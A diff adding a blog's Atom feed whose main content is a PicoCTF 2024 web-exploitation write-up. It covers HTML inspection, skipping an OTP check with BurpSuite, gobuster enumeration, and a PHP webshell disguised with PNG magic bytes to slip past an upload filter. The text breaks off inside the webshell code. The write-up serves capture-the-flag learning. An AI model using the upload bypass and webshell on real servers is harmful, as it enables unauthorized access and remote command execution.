@@ -1,0 +1,219 @@
+<?xml version="1.0" encoding="utf-8"?>
+<?xml-stylesheet href="https://rylie.moe/feed_style.xsl" type="text/xsl"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <tabi:metadata xmlns:tabi="https://github.com/welpo/tabi">
+        <tabi:base_url>https:&#x2F;&#x2F;rylie.moe</tabi:base_url>
+        <tabi:separator>
+            |
+        </tabi:separator>
+        <tabi:about_feeds>This is a web feed, also known as an Atom feed. Subscribe by copying the URL from the address bar into your newsreader. Visit About Feeds to learn more and get started. It&#x27;s free.</tabi:about_feeds>
+        <tabi:visit_the_site>Visit website</tabi:visit_the_site>
+        <tabi:recent_posts>Recent posts</tabi:recent_posts>
+        <tabi:last_updated_on>Updated on $DATE</tabi:last_updated_on>
+        <tabi:default_theme></tabi:default_theme>
+        <tabi:post_listing_date>date</tabi:post_listing_date>
+        <tabi:current_section>web</tabi:current_section>
+    </tabi:metadata><link rel="extra-stylesheet" href="https://rylie.moe/skins/sakura.css?h=2d9c69af51135683e3bd" /><title>lumi's trashcan - web</title>
+        <subtitle>my thoughts and rants.</subtitle>
+    <link href="https://rylie.moe/tags/web/atom.xml" rel="self" type="application/atom+xml"/>
+    <link href="https://rylie.moe/tags/web/" rel="alternate" type="text/html"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2024-08-02T00:00:00+00:00</updated>
+    <id>https://rylie.moe/tags/web/atom.xml</id><entry xml:lang="en">
+        <title>PicoCTF 2024: Web Exploitation</title>
+        <published>2024-08-02T00:00:00+00:00</published>
+        <updated>2024-08-02T00:00:00+00:00</updated>
+        <author>
+            <name>lumi</name>
+        </author>
+        <link rel="alternate" href="https://rylie.moe/blog/picoctf-2024-web/" type="text/html"/>
+        <id>https://rylie.moe/blog/picoctf-2024-web/</id>
+        
+            <content type="html">&lt;p&gt;I have considered myself… practically done with the Forensics category for
+PicoCTF 2024. It truly is a guessfest whether or not your first solution is
+correct - I can’t believe throwing out a random &lt;code&gt;find&lt;&#x2F;code&gt; into the command-line
+actually gave me the answer for &lt;a href=&quot;https:&#x2F;&#x2F;rylie.moe&#x2F;blog&#x2F;picoctf-2024-web&#x2F;picoctf-2024-forensics#mob-psycho&quot;&gt;Mob
+psycho&lt;&#x2F;a&gt;…&lt;&#x2F;p&gt;
+&lt;p&gt;Well, here we go again, this time in my arguably best non-forensics category -
+Web Exploitation! Once again, I will be going through each of the challenges and
+solving them, while writing out my thought process for each challenge.&lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Same thing as Forensics, this blogpost will describe the challenges and give
+the solutions to them - but I will not be giving out the flag in its entirety.
+All solutions with the flag in plain text will have the flag replaced by
+&lt;code&gt;picoCTF{flag}&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;h1 id=&quot;webdecode&quot;&gt;&lt;a class=&quot;header-anchor no-hover-padding&quot; href=&quot;#webdecode&quot; aria-label=&quot;Anchor link for: webdecode&quot;&gt;&lt;span class=&quot;link-icon&quot; aria-hidden=&quot;true&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;
+WebDecode&lt;&#x2F;h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Difficulty&lt;&#x2F;strong&gt;: Easy &lt;br &#x2F;&gt;
+&lt;strong&gt;Categories&lt;&#x2F;strong&gt;: none&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;Well… We’re thrown straight into a website that looks &lt;em&gt;really&lt;&#x2F;em&gt; suspicious.
+I’ll perform due dilligence and… inspect the site HTML. Nothing in the home
+page, so I’ll go into the About page.&lt;&#x2F;p&gt;
+&lt;p&gt;And upon loading the About page, wow, the &lt;strong&gt;very loud&lt;&#x2F;strong&gt; text saying “Try
+inspecting the page!! You might find it there” really confirms that I’m getting
+somewhere.&lt;&#x2F;p&gt;
+&lt;p&gt;Hitting F12 to open up my DevTools and I immediately see a weird section of
+HTML:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;html&quot; class=&quot;language-html z-code&quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-tag z-block z-any z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-begin z-html&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-tag z-block z-any z-html&quot;&gt;section&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-attribute-with-value z-class z-html&quot;&gt;&lt;span class=&quot;z-entity z-other z-attribute-name z-class z-html&quot;&gt;class&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-key-value z-html&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-html&quot;&gt;&lt;span class=&quot;z-meta z-class-name z-html&quot;&gt;about&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-attribute-with-value z-html&quot;&gt;&lt;span class=&quot;z-entity z-other z-attribute-name z-html&quot;&gt;notify_true&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-key-value z-html&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMDdiOTFjNzl9&lt;span class=&quot;z-punctuation z-definition z-string z-end z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-end z-html&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;   &lt;span class=&quot;z-meta z-tag z-block z-any z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-begin z-html&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-tag z-block z-any z-html&quot;&gt;h1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-end z-html&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;    Try inspecting the page!! You might find it there
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;   &lt;span class=&quot;z-meta z-tag z-block z-any z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-begin z-html&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-tag z-block z-any z-html&quot;&gt;h1&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-end z-html&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;   &lt;span class=&quot;z-comment z-block z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-begin z-html&quot;&gt;&amp;lt;!--&lt;&#x2F;span&gt; .about-container &lt;span class=&quot;z-punctuation z-definition z-comment z-end z-html&quot;&gt;--&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;  &lt;span class=&quot;z-meta z-tag z-block z-any z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-begin z-html&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-tag z-block z-any z-html&quot;&gt;section&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-end z-html&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;That string looks very suspicious. One quick run into the base64 decoder again,
+using:&lt;&#x2F;p&gt;
+&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ echo &amp;quot;cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMDdiOTFjNzl9&amp;quot; | base64 -d
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Aaaaaaaaand we’ve got it! Very simple challenge.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;unminify&quot;&gt;&lt;a class=&quot;header-anchor no-hover-padding&quot; href=&quot;#unminify&quot; aria-label=&quot;Anchor link for: unminify&quot;&gt;&lt;span class=&quot;link-icon&quot; aria-hidden=&quot;true&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;
+Unminify&lt;&#x2F;h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Difficulty&lt;&#x2F;strong&gt;: Easy &lt;br &#x2F;&gt;
+&lt;strong&gt;Categories&lt;&#x2F;strong&gt;: obfuscation, minification&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;Yet another webpage, similar to &lt;a href=&quot;https:&#x2F;&#x2F;rylie.moe&#x2F;blog&#x2F;picoctf-2024-web&#x2F;#webdecode&quot;&gt;WebDecode&lt;&#x2F;a&gt; above. Once again, let’s
+open up our DevTools and scan through the HTML.&lt;&#x2F;p&gt;
+&lt;p&gt;It didn’t take long before I reached this section of HTML:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;html&quot; class=&quot;language-html z-code&quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-tag z-block z-any z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-begin z-html&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-tag z-block z-any z-html&quot;&gt;p&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-attribute-with-value z-class z-html&quot;&gt;&lt;span class=&quot;z-entity z-other z-attribute-name z-class z-html&quot;&gt;class&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-key-value z-html&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-html&quot;&gt;&lt;span class=&quot;z-meta z-class-name z-html&quot;&gt;picoCTF{flag}&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-end z-html&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-tag z-block z-any z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-begin z-html&quot;&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-tag z-block z-any z-html&quot;&gt;p&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-end z-html&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;That’s our flag, time to copy it and submit it.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;bookmarklet&quot;&gt;&lt;a class=&quot;header-anchor no-hover-padding&quot; href=&quot;#bookmarklet&quot; aria-label=&quot;Anchor link for: bookmarklet&quot;&gt;&lt;span class=&quot;link-icon&quot; aria-hidden=&quot;true&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;
+Bookmarklet&lt;&#x2F;h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Difficulty&lt;&#x2F;strong&gt;: Easy &lt;br &#x2F;&gt;
+&lt;strong&gt;Categories&lt;&#x2F;strong&gt;: obfuscation, browser&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;The website gives us another site, in the same template as
+&lt;a href=&quot;https:&#x2F;&#x2F;rylie.moe&#x2F;blog&#x2F;picoctf-2024-web&#x2F;#unminify&quot;&gt;Unminify&lt;&#x2F;a&gt;. It also gives us a JavaScript bookmarklet to run as well.
+As it describes itself, it’s a bookmarklet - very similar to my Kamaitachi
+maimai DX &lt;a class=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;j1nxie&#x2F;kt-maimaidx-site-importer&quot;&gt;import script&lt;&#x2F;a&gt;.
+Let’s create a quick bookmark and throw this in as the URL.&lt;&#x2F;p&gt;
+&lt;p&gt;As soon as we click the bookmarklet, the flag shows up as an alert!&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;introtoburp&quot;&gt;&lt;a class=&quot;header-anchor no-hover-padding&quot; href=&quot;#introtoburp&quot; aria-label=&quot;Anchor link for: introtoburp&quot;&gt;&lt;span class=&quot;link-icon&quot; aria-hidden=&quot;true&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;
+IntroToBurp&lt;&#x2F;h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Difficulty&lt;&#x2F;strong&gt;: Easy &lt;br &#x2F;&gt;
+&lt;strong&gt;Categories&lt;&#x2F;strong&gt;: none&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;Well, as described by the challenge name, we’ll need
+&lt;a class=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;burp&quot;&gt;BurpSuite&lt;&#x2F;a&gt; for this. Let’s pull up BurpSuite and
+open the website in BurpSuite’s browser (Proxy &amp;gt; Intercept &amp;gt; Turn on Intercept).&lt;&#x2F;p&gt;
+&lt;p&gt;We see a little form that tells us to put our information in, and being the sane
+person that I am, I will put in my fully 100% real information into this.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;image&#x2F;picoctf&#x2F;introtoburp1.png&quot; alt=&quot;Screenshot of IntroToBurp form&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Hitting the Register button, while forwarding the packet as-is to the server,
+brings us to another form.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;image&#x2F;picoctf&#x2F;introtoburp2.png&quot; alt=&quot;Screenshot of IntroToBurp 2FA&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;It’s asking for an OTP code… but I haven’t received anything. Weird. Let’s try
+throwing in a random string… like &lt;code&gt;a&lt;&#x2F;code&gt; and submit it. BurpSuite nicely catches
+that request for us, and we can see the form data &lt;code&gt;otp=a&lt;&#x2F;code&gt; in the raw request
+packet. Let’s try… removing that and see what happens!&lt;&#x2F;p&gt;
+&lt;p&gt;After removing the OTP code from the form data, we got ourselves a nice
+malformed… well… form data sent over the wire. Let’s see how the server
+reacts… And we got our flag!&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;trickster&quot;&gt;&lt;a class=&quot;header-anchor no-hover-padding&quot; href=&quot;#trickster&quot; aria-label=&quot;Anchor link for: trickster&quot;&gt;&lt;span class=&quot;link-icon&quot; aria-hidden=&quot;true&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;
+Trickster&lt;&#x2F;h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Difficulty&lt;&#x2F;strong&gt;: Medium &lt;br &#x2F;&gt;
+&lt;strong&gt;Categories&lt;&#x2F;strong&gt;: none&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;This is actually… a pretty tough one if you don’t know where to immediately
+start. I opened up the site that the challenge gave, and there was no clear
+entry points to… anything, really. Uploading a PNG only gets a result string
+shown to you, like below.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;image&#x2F;picoctf&#x2F;trickster1.png&quot; alt=&quot;Screenshot of Trickster form&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;I tried accessing a random directory, e.g. &lt;code&gt;atlas.picoctf.net:&amp;lt;port&amp;gt;&#x2F;what&lt;&#x2F;code&gt;, and
+I got a 404 Not Found. That’s expected. I also see this is running Apache, which
+means… there’s PHP. But we haven’t seen any clear entry points to get an
+arbitrary PHP script running here.&lt;&#x2F;p&gt;
+&lt;p&gt;Let’s get back to the root site. Sitting here won’t do us any good, I guess it’s
+time to use some tools? Using &lt;code&gt;gobuster&lt;&#x2F;code&gt;, and running a brute-force for URIs
+like such:&lt;&#x2F;p&gt;
+&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ gobuster dir --url http:&#x2F;&#x2F;atlas.picoctf.net:&amp;lt;port&amp;gt;&#x2F; --wordlist &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;===============================================================
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Gobuster v3.6
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;===============================================================
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[+] Url:                     http:&#x2F;&#x2F;atlas.picoctf.net:&amp;lt;port&amp;gt;&#x2F;
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[+] Method:                  GET
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[+] Threads:                 10
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[+] Wordlist:                &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[+] Negative Status codes:   404
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[+] User Agent:              gobuster&#x2F;3.6
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[+] Timeout:                 10s
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;===============================================================
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Starting gobuster in directory enumeration mode
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;===============================================================
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;.htaccess            (Status: 403) [Size: 285]
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;.htpasswd            (Status: 403) [Size: 285]
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;robots.txt           (Status: 200) [Size: 62]
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;server-status        (Status: 403) [Size: 285]
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;uploads              (Status: 301) [Size: 333] [--&amp;gt; http:&#x2F;&#x2F;atlas.picoctf.net:49884&#x2F;uploads&#x2F;]
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Progress: 20469 &#x2F; 20470 (100.00%)
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;===============================================================
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Finished
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;===============================================================
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;We’re seeing &lt;code&gt;robots.txt&lt;&#x2F;code&gt; that we can access, and &lt;code&gt;&#x2F;uploads&lt;&#x2F;code&gt; being redirected to
+the root directory - looks like there’s gonna be an accessible folder there.
+Let’s try accessing &lt;code&gt;robots.txt&lt;&#x2F;code&gt;…&lt;&#x2F;p&gt;
+&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;User-agent: *
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Disallow: &#x2F;instructions.txt
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Disallow: &#x2F;uploads&#x2F;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;So the &lt;em&gt;very root&lt;&#x2F;em&gt; directory of &lt;code&gt;&#x2F;uploads&#x2F;&lt;&#x2F;code&gt; is not crawled, along with the file
+&lt;code&gt;instructions.txt&lt;&#x2F;code&gt;. Let’s try looking at &lt;code&gt;instructions.txt&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Let&amp;#39;s create a web app for PNG Images processing.
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;It needs to:
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Allow users to upload PNG images
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;	look for &amp;quot;.png&amp;quot; extension in the submitted files
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain &amp;#39;PNG&amp;#39; in hexadecimal: &amp;quot;50 4E 47&amp;quot; )
+&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Interesting… It looks like this doesn’t do much validation on the PNG files
+themselves, other than checking for the &lt;code&gt;.png&lt;&#x2F;code&gt; extension &lt;em&gt;existing&lt;&#x2F;em&gt; in the file
+name, and the first few bytes containing &lt;code&gt;PNG&lt;&#x2F;code&gt;. I guess the uploaded files will
+also be stored under &lt;code&gt;&#x2F;uploads&#x2F;&amp;lt;file_name&amp;gt;&lt;&#x2F;code&gt;? That’s an entry for our PHP now,
+no?&lt;&#x2F;p&gt;
+&lt;p&gt;I will modify
+&lt;a class=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;gist.github.com&#x2F;joswr1ght&#x2F;22f40787de19d80d110b37fb79ac3985&quot;&gt;easy-simple-php-webshell&lt;&#x2F;a&gt;
+a tiny bit, so it has the magic bytes for PNG at the top.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;php&quot; class=&quot;language-php z-code&quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;PNG
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-tag z-structure z-any z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-begin z-html&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-tag z-structure z-any z-html&quot;&gt;html&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-end z-html&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-tag z-structure z-any z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-begin z-html&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-tag z-structure z-any z-html&quot;&gt;body&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-end z-html&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-tag z-block z-form z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-tag z-begin z-html&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-tag z-block z-form z-html&quot;&gt;form&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-attribute-with-value z-html&quot;&gt;&lt;span class=&quot;z-entity z-other z-attribute-name z-html&quot;&gt;method&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-key-value z-html&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;GET&lt;span class=&quot;z-punctuation z-definition z-string z-end z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-attribute-with-value z-html&quot;&gt;&lt;span class=&quot;z-entity z-other z-attribute-name z-html&quot;&gt;name&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-key-value z-html&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-html&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-html&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-embedded z-line z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-begin z-php&quot;&gt;&amp;lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-embedded z-line z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt; &lt;span class=&quot;z-support z-function z-construct z-php&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-support z-function z-file z-php&quot;&gt;basename&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-global z-safer z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;_SERVER&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-php&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;PHP_SELF&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-php&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span 